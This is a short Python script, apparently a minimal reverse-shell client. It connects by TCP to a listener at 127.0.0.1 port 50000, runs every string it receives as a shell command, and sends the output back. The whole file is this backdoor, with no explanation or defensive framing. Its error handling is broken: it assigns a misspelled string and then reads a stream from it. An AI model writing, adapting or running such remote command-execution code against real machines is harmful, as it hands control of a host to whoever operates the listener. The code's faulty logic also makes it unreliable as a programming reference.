import socket
from subprocess import *
from sys import *

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',50000))

while True:
    msg = s.recv(4098).decode('utf-8')
    try:
        result = Popen([msg,],shell=True,stdout=PIPE,stdin=PIPE,stderr=PIPE)
    except:
        result = 'IVANLID COMMAND'
    s.send(result.stdout.read())
